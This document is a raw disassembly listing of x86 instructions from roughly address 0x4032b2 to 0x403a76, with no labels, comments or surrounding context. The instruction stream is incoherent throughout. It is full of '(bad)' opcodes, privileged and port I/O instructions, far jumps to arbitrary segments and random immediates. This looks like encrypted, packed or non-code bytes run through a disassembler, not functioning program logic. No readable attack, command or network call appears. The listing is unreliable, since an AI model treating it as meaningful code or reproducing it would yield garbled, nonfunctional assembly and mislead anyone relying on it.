  4032b2:	test   eax,0x4a12716c
  4032b7:	shr    ch,1
  4032b9:	or     ecx,edx
  4032bb:	push   ecx
  4032bc:	test   DWORD PTR [ebp+0x4],esi
  4032bf:	mov    WORD PTR [edx+0x1a],gs
  4032c2:	fcom   QWORD PTR [ebp-0x56]
  4032c5:	data16 clc 
  4032c7:	mov    dl,dh
  4032c9:	data16 das 
  4032cb:	pop    edi
  4032cc:	cmp    eax,0xc1d062ec
  4032d1:	dec    edx
  4032d2:	popa   
  4032d3:	jmp    0x403285
  4032d5:	outs   dx,BYTE PTR ds:[esi]
  4032d6:	dec    eax
  4032d7:	mov    ch,0x10
  4032d9:	popf   
  4032da:	vminpd ymm6,ymm4,YMMWORD PTR [edx+ebp*1+0x630630bd]
  4032e3:	pop    esp
  4032e4:	push   esi
  4032e5:	adc    ebx,DWORD PTR [ebp+0x4c]
  4032e8:	cmc    
  4032e9:	loopne 0x403346
  4032eb:	jle    0x4032b7
  4032ed:	(bad)  
  4032ef:	ret    0xdb6d
  4032f2:	push   edi
  4032f3:	cmc    
  4032f4:	add    BYTE PTR [edi-0x6b],dl
  4032f7:	ret    
  4032f8:	es loopne 0x4032fa
  4032fb:	pop    ds
  4032fc:	sar    BYTE PTR [ecx+0x47],cl
  4032ff:	add    ch,al
  403301:	jp     0x403291
  403303:	into   
  403304:	fisttp WORD PTR [ecx-0x2d8fb290]
  40330a:	jae    0x4032ab
  40330c:	arpl   WORD PTR [edi-0x707ee24],si
  403312:	push   es
  403313:	repnz push ecx
  403315:	and    BYTE PTR [eiz*2-0x203ba131],bh
  40331c:	call   0x4ed6:0x4a7e98c3
  403323:	mov    al,ds:0xcbc8db7d
  403328:	pop    edi
  403329:	mov    al,ds:0xc17382d7
  40332e:	xor    BYTE PTR [ecx],0xd8
  403331:	shl    DWORD PTR [ecx+esi*8+0x76],0x73
  403336:	std    
  403337:	xchg   dl,bl
  403339:	mov    eax,ds:0x8e67e187
  40333e:	dec    esp
  40333f:	les    esi,FWORD PTR [edx+0x7f]
  403342:	jmp    0x7c6900dd
  403347:	js     0x403337
  403349:	push   0xd2f3ec28
  40334e:	test   DWORD PTR [esi-0x47cccbc1],ebp
  403354:	push   ss
  403355:	or     eax,0x37f63be5
  40335a:	into   
  40335b:	icebp  
  40335c:	mov    WORD PTR [esi],gs
  40335e:	mov    BYTE PTR [edx],ah
  403360:	or     al,BYTE PTR [eax+0x5d]
  403363:	icebp  
  403364:	xchg   esp,eax
  403365:	and    ch,BYTE PTR [ecx-0x6d]
  403368:	dec    ebx
  403369:	dec    ebx
  40336a:	jl     0x403309
  40336c:	imul   ebp,edx,0x226321b
  403372:	shl    BYTE PTR [esi-0x38b59506],cl
  403378:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403379:	lds    edx,FWORD PTR [eax+esi*4-0x486dfd3c]
  403380:	stos   BYTE PTR es:[edi],al
  403381:	leave  
  403382:	xor    al,0xc1
  403384:	lods   eax,DWORD PTR ds:[esi]
  403385:	sub    eax,0x29756bf1
  40338a:	pop    ss
  40338b:	sbb    DWORD PTR [eax-0x14],0x17
  40338f:	xchg   edi,eax
  403390:	sbb    esp,DWORD PTR [ebx-0x72be303a]
  403396:	pusha  
  403397:	jecxz  0x4033f1
  403399:	data16 fmul DWORD PTR [edi]
  40339c:	mov    esp,0xf5d2df5e
  4033a1:	(bad)  
  4033a2:	in     al,0xe9
  4033a4:	mov    ebx,0x35d37437
  4033a9:	or     DWORD PTR [eax+0x60692791],esi
  4033af:	inc    ecx
  4033b0:	dec    esp
  4033b1:	cs popf 
  4033b3:	cmc    
  4033b4:	pop    esi
  4033b5:	add    DWORD PTR [ebx-0x76],ecx
  4033b8:	and    ecx,DWORD PTR [esi+0x62e0b857]
  4033be:	(bad)  
  4033bf:	jmp    0x4033d8
  4033c1:	outs   dx,DWORD PTR ds:[esi]
  4033c2:	push   ebp
  4033c3:	(bad)  
  4033c4:	stc    
  4033c5:	es cs out dx,eax
  4033c8:	imul   eax,DWORD PTR [esi+ebx*1-0x43efda7f],0x70
  4033d0:	mov    cl,0x48
  4033d2:	push   ds
  4033d3:	add    bl,BYTE PTR [edi-0x5b]
  4033d6:	adc    esp,ebp
  4033d8:	sti    
  4033d9:	xchg   DWORD PTR [ebx],ecx
  4033db:	(bad)  
  4033dc:	nop
  4033dd:	dec    esi
  4033de:	inc    edx
  4033df:	mov    dl,0x49
  4033e1:	mov    bh,0xa5
  4033e3:	jl     0x4033aa
  4033e5:	(bad)  
  4033e6:	arpl   WORD PTR [ebx],di
  4033e8:	sbb    edi,DWORD PTR [eax]
  4033ea:	or     ecx,0xffffff98
  4033ed:	pop    ebp
  4033ee:	scas   eax,DWORD PTR es:[edi]
  4033ef:	test   ch,bl
  4033f1:	or     ebx,DWORD PTR [esi+0x38]
  4033f4:	and    bl,BYTE PTR [edi+0x7ef65851]
  4033fa:	xor    eax,0x1e44bca8
  4033ff:	jmp    FWORD PTR [esi-0x67]
  403402:	sub    BYTE PTR [edi-0x5564f5e4],dh
  403408:	push   ds
  403409:	push   ecx
  40340a:	shl    DWORD PTR [edi+0x1],cl
  40340d:	lods   al,BYTE PTR ds:[esi]
  40340e:	cli    
  40340f:	xor    al,0xb
  403411:	pop    esi
  403412:	imul   edx,ebx,0x13fd4b01
  403418:	pop    ecx
  403419:	jmp    0xe40eacc6
  40341e:	xor    dl,BYTE PTR [ebp-0x6f6c976a]
  403424:	mov    ecx,0x2a4be7ca
  403429:	pop    esp
  40342a:	pushf  
  40342b:	xlat   BYTE PTR ds:[ebx]
  40342c:	mov    bh,0x97
  40342e:	xchg   edx,eax
  40342f:	push   ss
  403430:	repnz out dx,eax
  403432:	push   0xffffffe8
  403434:	fs icebp 
  403436:	out    dx,al
  403437:	mov    eax,ds:0xab3883a9
  40343c:	mov    edi,DWORD PTR [esp+edx*4+0xa265cd1]
  403443:	inc    edi
  403444:	outs   dx,DWORD PTR ds:[esi]
  403445:	mov    eax,ds:0xe4a228e8
  40344a:	in     eax,0x35
  40344c:	(bad)  
  40344e:	mov    eax,esp
  403450:	pushaw 
  403452:	sub    edi,DWORD PTR [ebx]
  403454:	pmulhw mm7,mm2
  403457:	jle    0x4033ee
  403459:	jge    0x403403
  40345b:	outs   dx,BYTE PTR ds:[esi]
  40345c:	push   0x78f292f0
  403461:	mov    edx,DWORD PTR [edx]
  403463:	xchg   edi,eax
  403464:	int3   
  403465:	aam    0x6b
  403467:	mov    bh,0x9b
  403469:	add    edi,DWORD PTR [ebp+0x29]
  40346c:	inc    eax
  40346d:	dec    ecx
  40346e:	gs nop
  403470:	push   es
  403471:	fs jp  0x403468
  403474:	shr    DWORD PTR [ebp+0xb],cl
  403477:	sub    esi,ecx
  403479:	add    DWORD PTR [esi+0x4c15b960],edi
  40347f:	icebp  
  403480:	or     eax,0x88a4ac97
  403485:	jecxz  0x40341b
  403487:	cli    
  403488:	loope  0x4034f4
  40348a:	adc    BYTE PTR [esi],dh
  40348c:	lods   eax,DWORD PTR ds:[esi]
  40348d:	sbb    esi,eax
  40348f:	mov    ds:0x6d7a4c3e,eax
  403494:	ins    BYTE PTR es:[edi],dx
  403495:	sbb    eax,0xa99c2fb1
  40349a:	sbb    ebx,DWORD PTR [edi]
  40349c:	dec    edi
  40349d:	and    al,0xe4
  40349f:	xchg   edx,eax
  4034a0:	das    
  4034a1:	scas   eax,DWORD PTR es:[edi]
  4034a2:	daa    
  4034a3:	(bad)  
  4034a4:	xchg   esp,eax
  4034a5:	pop    edx
  4034a6:	inc    eax
  4034a7:	xchg   eax,ecx
  4034a9:	sbb    DWORD PTR [esi],edx
  4034ab:	lods   eax,DWORD PTR ds:[esi]
  4034ac:	jo     0x4034c6
  4034ae:	xor    esi,DWORD PTR [eax+0x7ff9c1f1]
  4034b4:	ror    BYTE PTR [eax],cl
  4034b6:	sub    al,0xf9
  4034b8:	jmp    0xc703cfab
  4034bd:	xor    BYTE PTR [esp+edi*2-0x24a82aae],ah
  4034c4:	(bad)  
  4034c5:	xchg   ebx,eax
  4034c6:	clc    
  4034c7:	push   0x64a9c791
  4034cc:	loopne 0x403536
  4034ce:	mov    ebx,DWORD PTR [ebp+0x7bc2cacf]
  4034d4:	xchg   edx,eax
  4034d5:	jp     0x403494
  4034d7:	mov    ds:0xafe3dc29,al
  4034dc:	mov    ss,WORD PTR [edx-0x17]
  4034df:	mov    dl,0xac
  4034e1:	push   es
  4034e2:	sub    eax,0x8411f35b
  4034e7:	add    DWORD PTR [eax+0x3d7520f2],edi
  4034ed:	or     eax,0x971aad04
  4034f2:	or     eax,DWORD PTR [esi]
  4034f4:	fst    QWORD PTR [edi+0x35]
  4034f7:	mov    dl,0x40
  4034f9:	int3   
  4034fa:	std    
  4034fb:	js     0x403547
  4034fd:	aam    0xc6
  4034ff:	xchg   DWORD PTR [esi-0x3a],ebp
  403502:	jnp    0x40353d
  403504:	mov    esp,0x567bf77
  403509:	sbb    esi,eax
  40350b:	cwde   
  40350c:	inc    eax
  40350d:	icebp  
  40350e:	imul   eax,DWORD PTR [eax],0xffffffc4
  403511:	push   0xcfb78a73
  403516:	not    edx
  403518:	dec    edi
  403519:	shl    BYTE PTR [eax],1
  40351b:	pop    ss
  40351c:	std    
  40351d:	jae    0x4034aa
  40351f:	xchg   ebp,eax
  403520:	inc    esi
  403521:	dec    eax
  403522:	aad    0xfd
  403524:	stos   DWORD PTR es:[edi],eax
  403525:	xor    BYTE PTR [eax],0xb2
  403528:	push   edx
  403529:	repz retf 
  40352b:	pop    ebx
  40352c:	popa   
  40352d:	popf   
  40352e:	into   
  40352f:	push   edx
  403530:	sub    eax,0x529f27a8
  403535:	fiadd  WORD PTR [eax-0x61]
  403538:	ins    BYTE PTR es:[edi],dx
  403539:	scas   al,BYTE PTR es:[edi]
  40353a:	push   ebx
  40353b:	xor    dh,cl
  40353d:	push   edx
  40353e:	cwde   
  40353f:	mul    al
  403541:	jl     0x403573
  403543:	pop    ecx
  403544:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403545:	in     al,0x72
  403547:	neg    BYTE PTR [ebx+0x1a4eed14]
  40354d:	fs mov edx,0xb5608039
  403553:	sahf   
  403554:	neg    DWORD PTR [esi+eax*4-0x64]
  403558:	jmp    0x60e5:0xff981f3f
  40355f:	adc    dl,0x46
  403562:	lock jb 0x4035d6
  403565:	(bad)  
  403566:	sub    BYTE PTR [eax+0x2c],bh
  403569:	data16 add al,0x96
  40356c:	mov    WORD PTR [eax],?
  40356e:	xchg   edx,eax
  40356f:	mov    ds:0xf52cca87,eax
  403574:	push   0x710575d1
  403579:	mov    esp,0x9ddb7d85
  40357e:	mov    ch,BYTE PTR [edx-0x6a]
  403581:	inc    esi
  403582:	pusha  
  403583:	pop    eax
  403584:	sbb    ebx,ebx
  403586:	sbb    BYTE PTR [ecx-0x2e4d5e14],bl
  40358c:	pop    edi
  40358d:	cmp    ah,BYTE PTR [eax]
  40358f:	aaa    
  403590:	xchg   esp,eax
  403591:	ret    0x9328
  403594:	dec    esi
  403595:	or     bl,BYTE PTR [si+0x2c]
  403599:	test   BYTE PTR [eax-0x6a],bh
  40359c:	mov    esp,edx
  40359e:	jp     0x403527
  4035a0:	rcr    ecx,cl
  4035a2:	sub    al,0x96
  4035a4:	loopne 0x40353c
  4035a6:	push   ds
  4035a7:	dec    ebp
  4035a8:	add    DWORD PTR [ecx+0x43],edx
  4035ab:	dec    esp
  4035ac:	adc    esi,edx
  4035ae:	push   cs
  4035af:	sbb    esi,DWORD PTR [edx+0x25]
  4035b2:	fcomp  DWORD PTR [ecx+0x16]
  4035b5:	pop    es
  4035b6:	and    al,0x99
  4035b8:	sar    esi,1
  4035ba:	fs retf 
  4035bc:	lds    edi,FWORD PTR [ecx]
  4035be:	test   al,0xf3
  4035c0:	sbb    al,0x8d
  4035c2:	mov    al,0x89
  4035c4:	xchg   edx,ebx
  4035c6:	mov    edi,ebp
  4035c8:	adc    bl,BYTE PTR [esi]
  4035ca:	enter  0xe9a9,0x8f
  4035ce:	sahf   
  4035cf:	sub    BYTE PTR [esp],0x10
  4035d3:	aam    0xa6
  4035d5:	sub    bl,0x51
  4035d8:	ins    DWORD PTR es:[edi],dx
  4035d9:	sbb    BYTE PTR [ebx+0x2a],cl
  4035dc:	aam    0x67
  4035de:	jno    0x403612
  4035e0:	bound  ecx,QWORD PTR [ebp-0x4a]
  4035e3:	jl     0x403658
  4035e5:	xor    ecx,DWORD PTR [ecx-0x360e544f]
  4035eb:	xor    al,0xe1
  4035ed:	mov    edx,0x13937c70
  4035f2:	ror    BYTE PTR [ebx],0x36
  4035f5:	push   cs
  4035f6:	dec    esi
  4035f7:	pop    ebp
  4035f8:	icebp  
  4035f9:	ds cmp al,0x70
  4035fc:	mov    edi,0x964804a7
  403601:	dec    eax
  403602:	or     ebx,DWORD PTR [esi+0x588e1fe3]
  403608:	(bad)  
  40360a:	cmc    
  40360b:	or     BYTE PTR [ebp+0x1395c089],ch
  403611:	push   esi
  403612:	and    ebp,ecx
  403614:	add    DWORD PTR [ecx-0x7c8d27c8],ecx
  40361a:	push   ebx
  40361b:	test   BYTE PTR [ebx+ebp*2],ah
  40361e:	mov    ch,0x92
  403620:	ja     0x4035e7
  403622:	lock jmp 0xfaf3:0xb448bdae
  40362a:	sub    al,BYTE PTR [ebx+0x12d9a453]
  403630:	or     cl,BYTE PTR [edi+0x5a]
  403633:	ins    DWORD PTR es:[edi],dx
  403634:	std    
  403635:	pop    ss
  403636:	idiv   BYTE PTR ds:0x2e281ebf
  40363c:	fs ins BYTE PTR es:[edi],dx
  40363e:	(bad)  
  40363f:	aad    0xf3
  403641:	or     ch,BYTE PTR [esi-0x79]
  403644:	cmp    BYTE PTR ds:0xb5645d8a,dl
  40364a:	rcl    BYTE PTR [ebp+0x7f],0xee
  40364e:	imul   eax,esi,0x7f
  403651:	aad    0xf7
  403653:	aad    0xd9
  403655:	pop    edx
  403656:	sahf   
  403657:	adc    edi,esp
  403659:	data16 add al,0xe
  40365c:	ins    DWORD PTR es:[edi],dx
  40365d:	inc    esp
  40365e:	outs   dx,BYTE PTR ds:[esi]
  40365f:	sub    al,0x9a
  403661:	jb     0x403630
  403663:	push   esp
  403664:	xor    ebx,0xffffffee
  403667:	repz and DWORD PTR [eax-0x53],edx
  40366b:	ret    0x7734
  40366e:	ret    0xa33
  403671:	out    dx,eax
  403672:	sub    eax,0xde50e562
  403677:	iret   
  403678:	mov    WORD PTR ds:0x2c5c870d,cs
  40367e:	fisttp DWORD PTR [eax]
  403680:	popf   
  403681:	and    ch,0x73
  403684:	xchg   BYTE PTR ds:0x302fdfa,bh
  40368a:	rcr    dh,0x29
  40368d:	aaa    
  40368e:	sahf   
  40368f:	fisubr DWORD PTR [ecx-0x28523ff]
  403695:	jg     0x4036cc
  403697:	cmp    DWORD PTR [edx+0x65bc5bdc],edi
  40369d:	jb     0x403697
  40369f:	(bad)  [eax+0x321170c3]
  4036a5:	jecxz  0x403720
  4036a7:	stc    
  4036a8:	(bad)  
  4036a9:	data16 jp 0x403640
  4036ac:	mov    eax,0x949b32dd
  4036b1:	mov    al,ds:0xe3d2dabf
  4036b6:	jb     0x40364f
  4036b8:	pop    ebx
  4036b9:	das    
  4036ba:	enter  0xd123,0xac
  4036be:	or     DWORD PTR [ecx],ecx
  4036c0:	adc    esp,esp
  4036c2:	adc    al,0xca
  4036c4:	push   edx
  4036c5:	fnstenv [edi-0x1d]
  4036c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036c9:	test   DWORD PTR [ecx+ebp*8-0x36],0x7391f0b7
  4036d1:	int    0x1a
  4036d3:	cmp    DWORD PTR [edi+0xb2021bc],0xffffff83
  4036da:	xchg   edi,eax
  4036db:	pop    ebp
  4036dc:	jge    0x4036df
  4036de:	arpl   WORD PTR [esi+eax*2],ax
  4036e1:	jb     0x403698
  4036e3:	aaa    
  4036e4:	or     al,0x74
  4036e6:	pop    ecx
  4036e7:	fbstp  TBYTE PTR [eax]
  4036e9:	pop    eax
  4036ea:	pop    esi
  4036eb:	mov    al,ds:0x328e6d60
  4036f0:	cmp    al,0xab
  4036f2:	mov    esi,0x34f4f649
  4036f7:	test   BYTE PTR [edx+eiz*8],bl
  4036fa:	mov    al,ds:0x92eabdb9
  4036ff:	mov    bh,dl
  403701:	gs enter 0xf29a,0xec
  403706:	imul   ecx,DWORD PTR [ecx-0x18eee537],0x679b3d3
  403710:	fucomi st,st(3)
  403712:	mov    eax,ds:0xf7932bf8
  403717:	mov    bl,0xb
  403719:	mov    cl,0x9c
  40371b:	sub    DWORD PTR [edi+0x1c],ecx
  40371e:	inc    esi
  40371f:	mov    bl,0x93
  403721:	sub    ecx,DWORD PTR [ecx]
  403723:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  403725:	out    dx,al
  403726:	int3   
  403727:	daa    
  403728:	or     ax,0xd394
  40372c:	test   BYTE PTR [eax+0x37],cl
  40372f:	retf   
  403730:	ud1    edi,DWORD PTR [ecx+0xa]
  403734:	sbb    DWORD PTR [ebp+0x7265a8d9],edi
  40373a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40373b:	call   0x5dac:0x23b459ec
  403742:	inc    ebx
  403743:	mov    bh,0x1b
  403745:	push   ss
  403746:	pop    ecx
  403747:	in     eax,dx
  403748:	push   ss
  403749:	retf   
  40374a:	fninit 
  40374c:	cmp    BYTE PTR [edi],dh
  40374e:	pusha  
  40374f:	or     dl,dl
  403751:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403752:	aam    0xa3
  403754:	mov    BYTE PTR [eax-0x6724966e],0xda
  40375b:	outs   dx,BYTE PTR ds:[esi]
  40375c:	pop    ds
  40375d:	push   ebx
  40375e:	sbb    DWORD PTR [esi-0x3a6ae55a],ecx
  403764:	outs   dx,DWORD PTR ds:[esi]
  403765:	xchg   ah,dl
  403767:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403768:	lods   al,BYTE PTR ds:[esi]
  403769:	mov    eax,ds:0xb6c9bd12
  40376e:	push   0x46
  403770:	in     eax,0xaf
  403772:	ret    0x2838
  403775:	xor    DWORD PTR [ebp-0x25cd4e00],0x67
  40377c:	mov    bl,0xfe
  40377e:	bound  edx,QWORD PTR [esi+0xf203f04]
  403784:	and    BYTE PTR [edx-0x30],0xdc
  403788:	mov    bh,0xef
  40378a:	mov    eax,0xba1fd02f
  40378f:	mov    ecx,0x952f346c
  403794:	retf   
  403795:	push   cs
  403796:	sbb    eax,edx
  403798:	(bad)  
  403799:	stc    
  40379a:	jns    0x403771
  40379c:	mov    al,0x38
  40379e:	cmp    eax,0x5bba3938
  4037a3:	jle    0x4037c1
  4037a5:	dec    ebp
  4037a6:	mov    ecx,0xf2d9c1eb
  4037ab:	cmc    
  4037ac:	dec    edi
  4037ad:	or     eax,esp
  4037af:	push   ebx
  4037b0:	jns    0x4037e3
  4037b2:	cmp    DWORD PTR [edx-0x6e],0x496928ea
  4037b9:	jb     0x403768
  4037bb:	inc    edx
  4037bc:	pop    eax
  4037bd:	inc    eax
  4037be:	jl     0x403801
  4037c0:	mov    cl,0x7d
  4037c2:	and    BYTE PTR [esi-0x6d082457],0xed
  4037c9:	pop    ds
  4037ca:	imul   edi,DWORD PTR [eax],0x28
  4037cd:	je     0x4037cf
  4037cf:	adc    ecx,DWORD PTR [esi-0x6f]
  4037d2:	arpl   WORD PTR ds:0xb3386a8c,si
  4037d8:	aas    
  4037d9:	inc    edx
  4037da:	ds dec ebp
  4037dc:	sub    al,0x7b
  4037de:	test   eax,0x299c4c7d
  4037e3:	loopne 0x403814
  4037e5:	mov    edi,0x11e2c44f
  4037ea:	mov    eax,0x41d7e3c4
  4037ef:	ins    BYTE PTR es:[edi],dx
  4037f0:	and    BYTE PTR [ecx+0x2360394b],dl
  4037f6:	mov    ch,0xf8
  4037f8:	dec    ebp
  4037f9:	rcl    DWORD PTR ds:[ebp-0x5],1
  4037fd:	or     edi,eax
  4037ff:	push   ds
  403800:	jge    0x40385b
  403802:	retf   
  403803:	xchg   BYTE PTR [esi],bh
  403805:	out    dx,al
  403806:	mov    eax,0x774a7725
  40380b:	call   DWORD PTR [esi]
  40380d:	push   0xffffffee
  40380f:	push   es
  403810:	repz out dx,eax
  403812:	mov    WORD PTR [esi+0x5e6d5941],ss
  403818:	outs   dx,BYTE PTR ds:[esi]
  403819:	les    edi,FWORD PTR [edi]
  40381b:	(bad)  
  40381d:	mov    dl,0xf8
  40381f:	jp     0x403898
  403821:	dec    ebp
  403822:	xchg   ecx,eax
  403823:	jae    0x40385b
  403825:	xchg   edi,eax
  403826:	adc    eax,0x6eed9834
  40382b:	leave  
  40382c:	pushf  
  40382d:	mov    edi,es
  40382f:	ja     0x40383f
  403831:	mov    al,0x46
  403833:	mov    edi,0x63994632
  403838:	das    
  403839:	xchg   ebx,eax
  40383a:	cmp    DWORD PTR [esi-0x387ce88a],esi
  403840:	push   0xffffff9a
  403842:	pop    ebx
  403843:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403844:	inc    esi
  403845:	daa    
  403846:	scas   eax,DWORD PTR es:[edi]
  403847:	mov    esi,0x5c89fdf1
  40384c:	jl     0x40380c
  40384e:	adc    dl,dh
  403850:	push   0x2d6bbe15
  403855:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403856:	icebp  
  403857:	lahf   
  403858:	inc    ebp
  403859:	sub    BYTE PTR [edi+0x4bb20c67],ch
  40385f:	das    
  403860:	cmp    eax,eax
  403862:	mov    eax,ds:0xbf25fab9
  403868:	and    al,0x39
  40386b:	stos   BYTE PTR es:[edi],al
  40386c:	xor    bh,BYTE PTR [ebp-0x193c1f82]
  403872:	int    0xa9
  403874:	in     eax,dx
  403875:	sbb    BYTE PTR [edi],bl
  403877:	dec    eax
  403878:	pop    ebp
  403879:	mov    ch,0xf3
  40387b:	rcl    dl,0xef
  40387e:	test   al,0xa2
  403880:	lods   eax,DWORD PTR ds:[esi]
  403881:	mov    DWORD PTR [edi-0x18e2b4ab],eax
  403887:	shl    DWORD PTR [ecx+0x1bef2fd8],cl
  40388d:	push   DWORD PTR [esi]
  40388f:	mov    ecx,ebx
  403891:	adc    dh,BYTE PTR [ecx+ebx*2]
  403894:	int3   
  403895:	adc    eax,0x6061b2d0
  40389a:	lock inc edx
  40389c:	popa   
  40389d:	pusha  
  40389e:	hlt    
  40389f:	adc    edi,DWORD PTR ds:0x2029ffb6
  4038a5:	push   0x7126f9f5
  4038aa:	leave  
  4038ab:	(bad)  
  4038ad:	jo     0x4038e1
  4038af:	cli    
  4038b0:	outs   dx,DWORD PTR ds:[esi]
  4038b1:	rcr    bl,cl
  4038b3:	mov    WORD PTR [ebx-0x37],gs
  4038b6:	(bad)  
  4038b7:	rcl    DWORD PTR [edi+ebx*2],cl
  4038ba:	stos   DWORD PTR es:[edi],eax
  4038bb:	pop    eax
  4038bc:	sub    esp,DWORD PTR [esi+ebp*4+0x2d999f56]
  4038c3:	and    DWORD PTR [ecx],ebx
  4038c5:	out    dx,al
  4038c6:	lods   al,BYTE PTR cs:[esi]
  4038c8:	add    ebx,0xffffffc7
  4038cb:	add    eax,0x445884ed
  4038d0:	inc    ecx
  4038d1:	sbb    ebp,esi
  4038d3:	and    al,0x34
  4038d5:	mov    dh,0xf9
  4038d7:	(bad)  
  4038d8:	pop    eax
  4038d9:	sub    esp,eax
  4038db:	pop    ss
  4038dc:	inc    edx
  4038dd:	out    0xd5,eax
  4038df:	dec    edi
  4038e0:	or     eax,0xad00fa64
  4038e5:	fnstcw WORD PTR [edx+ecx*2]
  4038e8:	xchg   ebx,eax
  4038e9:	cmp    eax,0xe0744fd8
  4038ee:	std    
  4038ef:	stos   BYTE PTR es:[edi],al
  4038f0:	and    ebx,DWORD PTR [edi]
  4038f2:	sub    eax,0x8bad1307
  4038f7:	lds    edi,FWORD PTR [esi-0x31]
  4038fa:	add    BYTE PTR [edi+0x274828d7],bl
  403900:	jo     0x40394c
  403902:	add    eax,0xdf3deed0
  403907:	inc    ebx
  403908:	ins    BYTE PTR es:[edi],dx
  403909:	adc    edx,esi
  40390b:	cmp    BYTE PTR [eax-0xd],dh
  40390e:	mov    bh,0x4c
  403910:	popa   
  403911:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403912:	loopne 0x4038b1
  403914:	push   0x8fd2ceda
  403919:	xchg   esp,eax
  40391a:	pop    ss
  40391b:	fld    DWORD PTR [esi+edx*2-0x16e9b5a4]
  403922:	xchg   BYTE PTR [eax-0x1b33c6be],ch
  403928:	add    al,bl
  40392a:	fidiv  DWORD PTR [edi+0x10b4aebc]
  403930:	arpl   WORD PTR [edi+0x21e27116],sp
  403936:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403937:	retf   0x347a
  40393a:	enter  0x3959,0x12
  40393e:	xor    eax,0x909c6137
  403943:	add    ch,BYTE PTR [ecx]
  403945:	pusha  
  403946:	or     esi,DWORD PTR [ebp+0x51a4da03]
  40394c:	jne    0x403915
  40394e:	(bad)  
  40394f:	test   edx,0x3e73171b
  403955:	jbe    0x40391c
  403957:	(bad)  
  403958:	jae    0x403995
  40395a:	ss in  al,0xc2
  40395d:	scas   al,BYTE PTR es:[edi]
  40395e:	jo     0x40390c
  403960:	fbld   TBYTE PTR [esp+ebx*2+0x77]
  403964:	fcom   DWORD PTR [eax+0x38]
  403967:	ins    BYTE PTR es:[edi],dx
  403968:	xchg   edx,ecx
  40396a:	js     0x403959
  40396c:	add    eax,0x6591ca4b
  403971:	pop    ebp
  403972:	sub    DWORD PTR [ebx],edi
  403974:	xlat   BYTE PTR ds:[ebx]
  403975:	data16 rcl BYTE PTR [edx-0x60542ed5],cl
  40397c:	jp     0x40398b
  40397e:	call   FWORD PTR [ebx]
  403980:	push   0x41
  403982:	pop    esi
  403983:	ret    0x8fed
  403986:	xchg   BYTE PTR [ebx-0xc219728],dl
  40398c:	add    dh,dh
  40398e:	shr    DWORD PTR ds:[ebp+0x20e9d554],1
  403995:	fisttp DWORD PTR [ebx]
  403997:	adc    esp,DWORD PTR [ebx]
  403999:	mov    edx,0xb40c3552
  40399e:	sbb    DWORD PTR [ebp-0x48],ecx
  4039a1:	les    ecx,FWORD PTR [esi]
  4039a3:	mov    bh,0x50
  4039a5:	call   0x4cb0:0xdafaed63
  4039ac:	sahf   
  4039ad:	xchg   esp,eax
  4039ae:	and    DWORD PTR [ebx],ecx
  4039b0:	(bad)  
  4039b1:	pop    ecx
  4039b2:	mov    dh,0xe4
  4039b4:	sub    bh,BYTE PTR [eax]
  4039b6:	xor    eax,DWORD PTR [edx+0x7f]
  4039b9:	push   eax
  4039ba:	ja     0x4039f8
  4039bc:	cdq    
  4039bd:	mov    esi,0xe01a4a7f
  4039c2:	nop
  4039c3:	cmp    al,0xdf
  4039c5:	jmp    0xf7da:0xf002fff0
  4039cc:	mov    esi,0xa36d7253
  4039d1:	sysret 
  4039d3:	or     al,BYTE PTR [ebx]
  4039d5:	pop    eax
  4039d6:	in     eax,0x35
  4039d8:	cmp    eax,0xd836ac6d
  4039dd:	xchg   edx,eax
  4039de:	sbb    ecx,DWORD PTR [ecx-0x49]
  4039e1:	stc    
  4039e2:	jge    0x403a06
  4039e4:	mov    cl,BYTE PTR [edi-0x6b7c7e57]
  4039ea:	(bad)  
  4039eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039ec:	fstp   TBYTE PTR [edx-0x2a]
  4039ef:	clc    
  4039f0:	inc    ebx
  4039f1:	cmp    eax,0x6f9c0ec4
  4039f6:	js     0x4039a9
  4039f8:	xchg   esi,eax
  4039f9:	push   cs
  4039fa:	xchg   DWORD PTR cs:[esi+0x7a9207aa],ecx
  403a01:	push   ds
  403a02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a03:	sti    
  403a04:	int    0x7a
  403a06:	test   al,0x64
  403a08:	pop    edx
  403a09:	mov    ebx,0xf84d4223
  403a0e:	inc    esi
  403a0f:	imul   eax,DWORD PTR [ebx-0x262299b],0xffffffe0
  403a16:	stos   BYTE PTR es:[edi],al
  403a17:	call   0xe34ddae4
  403a1c:	add    ch,dl
  403a1e:	pop    esi
  403a1f:	pop    ss
  403a20:	pxor   mm2,QWORD PTR [ecx-0x6033b00e]
  403a27:	inc    ecx
  403a28:	sub    WORD PTR [ebx+0x26419683],sp
  403a2f:	lods   al,BYTE PTR ds:[esi]
  403a30:	les    ebx,FWORD PTR [edi]
  403a32:	add    BYTE PTR [ecx+0x1e],ch
  403a35:	ret    
  403a36:	xchg   BYTE PTR [esi],al
  403a38:	cmp    esp,DWORD PTR [ebp+0x5d]
  403a3b:	mov    ds:0xbab8ff96,al
  403a40:	stos   DWORD PTR es:[edi],eax
  403a41:	mov    dl,0x40
  403a43:	cld    
  403a44:	jnp    0x403aa7
  403a46:	mov    esp,0x638224eb
  403a4b:	xor    bh,ah
  403a4d:	inc    edx
  403a4e:	jb     0x4039e5
  403a50:	jne    0x4039fb
  403a52:	xchg   DWORD PTR [eax+ebp*2],ebp
  403a55:	lahf   
  403a56:	das    
  403a57:	add    eax,0x48fbd592
  403a5c:	inc    ebx
  403a5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a5e:	sub    bl,BYTE PTR [edi]
  403a60:	jl     0x403a1c
  403a62:	scas   al,BYTE PTR es:[edi]
  403a63:	sbb    ebx,esi
  403a65:	push   edi
  403a66:	sbb    eax,0x6214b312
  403a6b:	std    
  403a6c:	fist   DWORD PTR [eax-0x69]
  403a6f:	push   0x6b
  403a71:	icebp  
  403a72:	(bad)
  403a75:	aas    
  403a76:	retf   0x492f
